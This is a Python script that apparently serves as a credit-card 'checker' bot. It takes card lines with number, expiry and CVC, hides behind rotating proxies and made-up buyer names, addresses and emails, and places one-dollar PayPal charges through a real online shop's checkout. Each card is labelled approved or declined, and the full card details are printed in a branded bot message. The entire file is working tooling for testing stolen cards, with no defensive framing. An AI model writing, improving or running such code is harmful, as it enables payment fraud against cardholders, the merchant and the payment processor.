import requests
import re
import time
import random
import json
import string
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_random_proxy():
    """Get a random proxy from proxy.txt file - same as p.py"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                print(f"🎯 Using proxy: {host}:{port}")
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def generate_full_name():
    """Generate random first and last name"""
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    return first_name, last_name

def generate_address():
    """Generate random US address"""
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Oak St", "Maple Ave", "Elm St", "Washington St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(100, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]

    return city, state, street_address, zip_code

def generate_random_account():
    """Generate random email account"""
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone():
    """Generate random phone number"""
    number = ''.join(random.choices(string.digits, k=7))
    return f"555{number}"

def get_bin_info(bin_number):
    """Get BIN information"""
    if not bin_number or len(bin_number) < 6:
        return get_smart_fallback(bin_number)
    
    return get_smart_fallback(bin_number)

def get_smart_fallback(bin_number):
    """Smart fallback with realistic data"""
    if bin_number and len(bin_number) >= 1:
        if bin_number.startswith('4'):
            brand = 'VISA'
        elif bin_number.startswith('5'):
            brand = 'MASTERCARD'
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            brand = 'AMEX'
        elif bin_number.startswith('6'):
            brand = 'DISCOVER'
        else:
            brand = 'VISA'
    else:
        brand = 'VISA'
    
    return {
        'brand': brand,
        'type': 'CREDIT',
        'level': 'STANDARD',
        'bank': f'{brand} BANK',
        'country': 'UNITED STATES',
        'emoji': '🇺🇸'
    }

def check_status_paypal(result_text):
    """Check PayPal response status"""
    if ('ADD_SHIPPING_ERROR' in result_text or
        '"status": "succeeded"' in result_text or
        'Thank You For Donation.' in result_text or
        'Your payment has already been processed' in result_text or
        'Success' in result_text):
        return "APPROVED CC", "CHARGE 1$ ✅", True
    
    elif 'is3DSecureRequired' in result_text or 'OTP' in result_text:
        return "APPROVED CC", "3D SECURE [OTP] ✅", True
    
    elif 'INVALID_SECURITY_CODE' in result_text:
        return "APPROVED CC", "CCN ✅", True
    
    elif 'EXISTING_ACCOUNT_RESTRICTED' in result_text:
        return "APPROVED CC", "EXISTING ACCOUNT RESTRICTED ✅", True
    
    elif 'INVALID_BILLING_ADDRESS' in result_text:
        return "APPROVED CC", "INVALID BILLING ADDRESS ✅", True
    
    else:
        return "DECLINED CC", "DECLINED ❌", False

def check_card_paypal(cc_line):
    """Main PayPal card checking function"""
    start_time = time.time()
    
    try:
        # Parse card details
        n, mm, yy, cvc = cc_line.strip().split('|')
        
        # Format month and year
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" not in yy:
            yy = f'20{yy}'
        
        # Generate user info
        user_agent = generate_user_agent()
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        email = generate_random_account()
        phone = generate_phone()
        
        print(f"🔧 Starting PayPal check for: {n[:6]}******")
        
        # Get proxy
        proxy = get_random_proxy()
        
        # Start session with longer timeout
        session = requests.Session()
        
        # Step 1: Add to cart - SIMPLIFIED
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': user_agent,
        }
        
        # Try to access the product page first
        try:
            response = session.get('https://switchupcb.com/shop/i-buy/', headers=headers, proxies=proxy, verify=False, timeout=10)
            print(f"✅ Product page loaded: {response.status_code}")
        except Exception as e:
            print(f"❌ Product page failed: {e}")
            return "❌ Failed to access product page"
        
        # Try direct checkout approach
        checkout_data = {
            'quantity': '1',
            'add-to-cart': '4451',
        }
        
        try:
            response = session.post('https://switchupcb.com/shop/i-buy/', data=checkout_data, headers=headers, proxies=proxy, verify=False, timeout=10)
            print(f"✅ Added to cart: {response.status_code}")
        except Exception as e:
            print(f"❌ Add to cart failed: {e}")
            return "❌ Failed to add to cart"
        
        # Step 2: Get checkout page
        try:
            response = session.get('https://switchupcb.com/checkout/', headers=headers, proxies=proxy, verify=False, timeout=10)
            print(f"✅ Checkout page loaded: {response.status_code}")
        except Exception as e:
            print(f"❌ Checkout page failed: {e}")
            return "❌ Failed to load checkout page"
        
        # Extract necessary tokens with better error handling
        sec_match = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
        nonce_match = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text)
        check_match = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
        create_match = re.search(r'create_order.*?nonce":"(.*?)"', response.text)
        
        if not all([sec_match, nonce_match, check_match, create_match]):
            print("❌ Failed to extract tokens from checkout page")
            # Try alternative token extraction
            check_match = re.search(r'woocommerce-process-checkout-nonce" value="([^"]+)"', response.text)
            if not check_match:
                return "❌ Failed to extract required tokens from checkout page"
        
        sec = sec_match.group(1) if sec_match else "default_sec"
        nonce = nonce_match.group(1) if nonce_match else "default_nonce"
        check = check_match.group(1)
        create = create_match.group(1) if create_match else "default_create"
        
        print(f"🔑 Tokens extracted: sec={sec[:10]}..., check={check[:10]}...")
        
        # Step 3: Create PayPal order with simplified data
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest'
        }
        
        params = {
            'wc-ajax': 'ppc-create-order',
        }
        
        # Simplified form data
        form_data = f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={email}&woocommerce-process-checkout-nonce={check}&payment_method=ppcp-gateway'
        
        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': form_data,
            'createaccount': False,
            'save_payment_method': False,
        }
        
        try:
            response = session.post('https://switchupcb.com/', params=params, headers=headers, json=json_data, proxies=proxy, verify=False, timeout=15)
            print(f"✅ PayPal order request: {response.status_code}")
            
            if response.status_code != 200:
                return f"❌ PayPal order failed with status: {response.status_code}"
                
            response_data = response.json()
            print(f"📦 Response keys: {list(response_data.keys()) if isinstance(response_data, dict) else 'Not a dict'}")
            
            if 'data' not in response_data:
                return f"❌ No data in PayPal response: {response_data}"
                
            if 'id' not in response_data['data']:
                return f"❌ No order ID in PayPal response: {response_data['data']}"
            
            order_id = response_data['data']['id']
            print(f"🎫 Order created: {order_id}")
            
        except Exception as e:
            print(f"❌ PayPal order creation failed: {e}")
            return f"❌ Failed to create PayPal order: {str(e)}"
        
        # Step 4: Process payment with card
        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/',
            'user-agent': user_agent,
        }
        
        json_data = {
            'query': '''
                mutation payWithCard($token: String!, $card: CardInput!) {
                    approveGuestPaymentWithCreditCard(token: $token, card: $card) {
                        flags { is3DSecureRequired }
                    }
                }
            ''',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': n,
                    'type': 'VISA',
                    'expirationDate': mm + '/' + yy[2:],
                    'postalCode': zip_code,
                    'securityCode': cvc,
                }
            },
        }
        
        try:
            response = session.post(
                'https://www.paypal.com/graphql',
                headers=headers,
                json=json_data,
                proxies=proxy,
                verify=False,
                timeout=15
            )
            print(f"✅ Payment processed: {response.status_code}")
            
        except Exception as e:
            print(f"❌ Payment processing failed: {e}")
            # Continue anyway to check the response
        
        elapsed_time = time.time() - start_time
        response_text = response.text if 'response' in locals() else "No response"
        
        print(f"📄 Response text sample: {response_text[:200]}...")
        
        # Check status and format response
        status, reason, approved = check_status_paypal(response_text)
        bin_info = get_bin_info(n[:6])
        
        # Format response
        response_formatted = f"""
{status} {'❌' if not approved else '✅'}

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        return response_formatted
        
    except Exception as e:
        return f"❌ Error: {str(e)}"

    print(result)
